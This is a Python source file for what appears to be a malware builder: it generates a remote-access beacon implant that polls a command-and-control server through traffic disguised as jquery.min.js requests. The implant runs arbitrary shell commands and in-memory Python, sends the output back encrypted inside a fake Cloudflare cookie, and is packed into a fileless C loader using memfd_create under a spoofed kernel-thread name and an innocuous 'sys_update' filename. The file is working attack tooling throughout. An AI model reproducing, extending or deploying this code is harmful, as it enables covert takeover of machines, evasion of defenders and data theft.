import base64, os, subprocess, random, string, re, sys

class LogicBender:
    def __init__(self, c2_host="127.0.0.1"):
        self.agent_dir = "/home/dan/Chimera_Project/agents"
        self.pub_key_path = "/home/dan/Chimera_Project/certs/chimera_public.pem"
        self.c2_host = c2_host 
        if not os.path.exists(self.agent_dir): os.makedirs(self.agent_dir)

    def _sanitize_name(self, name):
        slug = re.sub(r'[^a-zA-Z0-9_]', '', name.split()[0].lower())
        return f"sys_update_{slug}_{''.join(random.choices(string.ascii_lowercase, k=4))}"

    def deploy_beacon_agent(self, name="GHOST_BEACON"):
        clean_name = self._sanitize_name(name)
        output_bin = os.path.join(self.agent_dir, clean_name)

        with open(self.pub_key_path, "r") as f:
            pub_key = f.read().replace('\n', '\\n')

        # The Advanced Beacon Payload (Handles Shell & Python Execution)
        python_payload = f"""
import base64, requests, os, sys, time, random, zlib, subprocess, json
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
from io import StringIO
import contextlib

C2_URL = "http://{self.c2_host}:8080"
SLEEP_TIME = 10
JITTER = 0.2

@contextlib.contextmanager
def capture_stdout():
    old_stdout, old_stderr = sys.stdout, sys.stderr
    sys.stdout, sys.stderr = StringIO(), StringIO()
    try: yield sys.stdout, sys.stderr
    finally: sys.stdout, sys.stderr = old_stdout, old_stderr

def execute():
    try:
        session_key = get_random_bytes(16)
        pub_key_obj = RSA.import_key('''{pub_key}''')
        cipher_rsa = PKCS1_OAEP.new(pub_key_obj)
        enc_key = base64.b64encode(cipher_rsa.encrypt(session_key)).decode()
        
        r = requests.get(f"{{C2_URL}}/lib/jquery.min.js", headers={{"ETag": enc_key}}, timeout=10)
        if r.status_code != 200: return

        while True:
            variance = SLEEP_TIME * JITTER
            time.sleep(SLEEP_TIME + random.uniform(-variance, variance))

            poll_r = requests.get(f"{{C2_URL}}/lib/jquery.min.js", timeout=10)
            
            if poll_r.status_code == 200:
                data = poll_r.json()
                task_enc = data.get("task")
                
                if task_enc and task_enc != "sleep":
                    blob = base64.b64decode(task_enc)
                    nonce, tag, ciphertext = blob[:16], blob[-16:], blob[16:-16]
                    cipher_aes = AES.new(session_key, AES.MODE_GCM, nonce=nonce)
                    instruction = cipher_aes.decrypt_and_verify(ciphertext, tag).decode()
                    
                    output = ""
                    cmd_type = instruction.split(":")[0]
                    payload = ":".join(instruction.split(":")[1:])
                    
                    if cmd_type == "shell":
                        try:
                            output = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=60).decode()
                        except subprocess.CalledProcessError as e: output = e.output.decode()
                        except Exception as e: output = str(e)
                    
                    elif cmd_type == "python":
                        # Execute Python payload dynamically in memory
                        code = base64.b64decode(payload).decode()
                        with capture_stdout() as (out, err):
                            try: exec(code, globals())
                            except Exception as e: print(f"Exec Error: {{e}}")
                        output = out.getvalue() + err.getvalue()
                        
                    result_dict = {{"command_type": cmd_type, "output": output}}
                    raw_data = json.dumps(result_dict).encode()
                    compressed = zlib.compress(raw_data)
                    res_b64 = base64.b64encode(compressed).decode()
                    
                    cipher_aes_out = AES.new(session_key, AES.MODE_GCM)
                    ct_out, tag_out = cipher_aes_out.encrypt_and_digest(res_b64.encode())
                    final_blob = base64.b64encode(cipher_aes_out.nonce + ct_out + tag_out).decode()
                    
                    requests.post(f"{{C2_URL}}/api/v1/telemetry", headers={{"Cookie": f"__cf_bm={{final_blob}}"}}, timeout=15)
                    
    except Exception as e: pass

if __name__ == "__main__": execute()
"""
        encoded_payload = base64.b64encode(python_payload.encode()).decode()
        
        # Phase 2: In-Memory Execution Wrapper (MFD_CLOEXEC set to 0)
        c_code = f"""
#define _GNU_SOURCE
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define FAKE_PROC_NAME "[kworker/u8:0]"

int main(int argc, char **argv, char **envp) {{
    int fd = memfd_create(FAKE_PROC_NAME, 0);
    if (fd == -1) return 1;

    char *stub_part1 = "import base64, sys\\n";
    char *stub_part2 = "exec(base64.b64decode('";
    char *payload = "{encoded_payload}";
    char *stub_part3 = "'))\\n";

    write(fd, stub_part1, strlen(stub_part1));
    write(fd, stub_part2, strlen(stub_part2));
    write(fd, payload, strlen(payload));
    write(fd, stub_part3, strlen(stub_part3));

    char fd_path[64];
    sprintf(fd_path, "/proc/self/fd/%d", fd);

    char *new_args[] = {{ FAKE_PROC_NAME, fd_path, NULL }};
    execve("/usr/bin/python3", new_args, envp);

    return 0;
}}
"""
        temp_c = f"{output_bin}.c"
        with open(temp_c, "w") as f: f.write(c_code)
        subprocess.run(["gcc", temp_c, "-o", output_bin], check=True)
        os.remove(temp_c)
        return output_bin
